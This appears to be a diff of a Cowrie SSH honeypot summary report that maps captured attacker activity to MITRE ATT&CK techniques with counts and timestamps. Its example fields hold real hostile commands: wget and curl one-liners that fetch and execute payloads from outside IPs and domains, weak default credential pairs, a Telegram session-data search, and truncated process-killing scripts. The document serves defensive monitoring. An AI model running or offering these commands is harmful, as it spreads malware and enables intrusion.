@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-13 22:05:12",
+  "generated": "2026-08-13 23:04:12",
   "totals": {
-    "commands": 3037,
-    "login_failed": 4392,
-    "login_success": 180,
-    "sessions": 4293
+    "commands": 3089,
+    "login_failed": 4958,
+    "login_success": 184,
+    "sessions": 4873
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 4392,
+      "count": 4958,
       "examples": [
         "user1 / 123456",
         "root / 1234567",
@@ -21,8 +21,8 @@
         "user1 / 12345678"
       ],
       "first": "2026-08-13T00:00:04.398982Z",
-      "last": "2026-08-13T22:05:02.597283Z",
-      "unique_ips": 184
+      "last": "2026-08-13T23:04:11.230443Z",
+      "unique_ips": 189
     },
     {
       "id": "T1222.002",
@@ -44,7 +44,7 @@
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 262,
+      "count": 274,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "http://185.93.89.72/wget",
@@ -53,14 +53,14 @@
         "curl -sL -o /tmp/install.sh https://del.sou.pp.ua/install.sh && bash /tmp/install.sh; rm -f /tmp/install.sh"
       ],
       "first": "2026-08-13T00:01:55.509663Z",
-      "last": "2026-08-13T21:59:15.098027Z",
-      "unique_ips": 53
+      "last": "2026-08-13T22:12:53.809253Z",
+      "unique_ips": 54
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 180,
+      "count": 184,
       "examples": [
         "root / root",
         "root / 123@@@",
@@ -69,8 +69,8 @@
         "orangepi / orangepi"
       ],
       "first": "2026-08-13T00:01:49.585213Z",
-      "last": "2026-08-13T21:58:02.166084Z",
-      "unique_ips": 126
+      "last": "2026-08-13T22:47:52.064505Z",
+      "unique_ips": 130
     },
     {
       "id": "T1033",
@@ -89,7 +89,7 @@
       "id": "T1082",
       "name": "System Information Discovery",
       "tactic": "Discovery",
-      "count": 31,
+      "count": 32,
       "examples": [
         "chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chatt",
         "uname -a",
@@ -98,22 +98,38 @@
         "cat /proc/cpuinfo"
       ],
       "first": "2026-08-13T00:24:55.186109Z",
-      "last": "2026-08-13T21:48:19.195685Z",
-      "unique_ips": 21
+      "last": "2026-08-13T22:10:17.379271Z",
+      "unique_ips": 22
     },
     {
       "id": "T1489",
       "name": "Service Stop",
       "tactic": "Impact",
-      "count": 12,
+      "count": 22,
       "examples": [
         "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# =================================",
         "for pid in /proc/[0-9]*; do pid_num=\"${pid##*/}\"; if [ -r \"$pid/maps\" ]; then suspicious=true; while IFS= read -r line; ",
-        "for pid in /proc/[0-9]*; do pid_num=${pid##*/}; if [ -r \"$pid/maps\" ]; then while IFS= read -r line; do case \"$line\" in "
+        "for pid in /proc/[0-9]*; do pid_num=${pid##*/}; if [ -r \"$pid/maps\" ]; then while IFS= read -r line; do case \"$line\" in ",
+        "#!/bin/sh\n\nfor proc_dir in /proc/*; do\n    pid=${proc_dir##*/}\n\n    result=$(ls -l \"/proc/$pid/exe\" 2> /dev/null)\n\n    i"
       ],
       "first": "2026-08-13T00:59:20.509086Z",
-      "last": "2026-08-13T16:38:08.951901Z",
-      "unique_ips": 2
+      "last": "2026-08-13T22:12:53.260966Z",
+      "unique_ips": 3
+    },
+    {
+      "id": "T1083",
+      "name": "File and Directory Discovery",
+      "tactic": "Discovery",
+      "count": 18,
+      "examples": [
+        "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# =================================",
+        "ls -la ~/.local/share/TelegramDesktop/tdata /home/*/.local/share/TelegramDesktop/tdata /dev/ttyGSM* /dev/ttyUSB-mod* /va",
+        "cd /tmp || cd /var/ || cd /var/run || cd /mnt || cd /root || cd /; rm -rf i; wget http://192.168.1.1:8088/i; curl -O htt",
+        "#!/bin/sh\n\nfor proc_dir in /proc/*; do\n    pid=${proc_dir##*/}\n\n    result=$(ls -l \"/proc/$pid/exe\" 2> /dev/null)\n\n    i"
+      ],
+      "first": "2026-08-13T00:59:20.509086Z",
+      "last": "2026-08-13T22:12:53.260966Z",
+      "unique_ips": 4
     },
     {
       "id": "T1059.004",
@@ -126,20 +142,6 @@
       ],
       "first": "2026-08-13T00:59:20.509086Z",
       "last": "2026-08-13T21:18:51.356069Z",
-      "unique_ips": 3
-    },
-    {
-      "id": "T1083",
-      "name": "File and Directory Discovery",
-      "tactic": "Discovery",
-      "count": 8,
-      "examples": [
-        "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# =================================",
-        "ls -la ~/.local/share/TelegramDesktop/tdata /home/*/.local/share/TelegramDesktop/tdata /dev/ttyGSM* /dev/ttyUSB-mod* /va",
-        "cd /tmp || cd /var/ || cd /var/run || cd /mnt || cd /root || cd /; rm -rf i; wget http://192.168.1.1:8088/i; curl -O htt"
-      ],
-      "first": "2026-08-13T00:59:20.509086Z",
-      "last": "2026-08-13T21:04:44.513096Z",
       "unique_ips": 3
     },
     {
@@ -234,7 +236,7 @@
   "unmapped": [
     [
       "/bin/busybox",
-      1078
+      1081
     ],
     [
       "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
@@ -242,27 +244,27 @@
     ],
     [
       "sh",
-      78
+      80
     ],
     [
       "shell",
-      76
+      78
     ],
     [
       "system",
-      68
+      69
     ],
     [
       "enable",
-      63
+      64
     ],
     [
       "linuxshell",
-      55
+      56
     ],
     [
       "ping ;sh",
-      45
+      46
     ],
     [
       "enablelinuxshell",
@@ -289,6 +291,10 @@
       20
     ],
     [
+      "sh .k",
+      10
+    ],
+    [
       ">/tmp/.codi && cd /tmp/",
       8
     ],
@@ -306,10 +312,6 @@
     ],
     [
       ">/var/run/.codi && cd /var/run/",
-      8
-    ],
-    [
-      ">/var/tmp/.codi && cd /var/tmp/",
       8
     ]
   ]
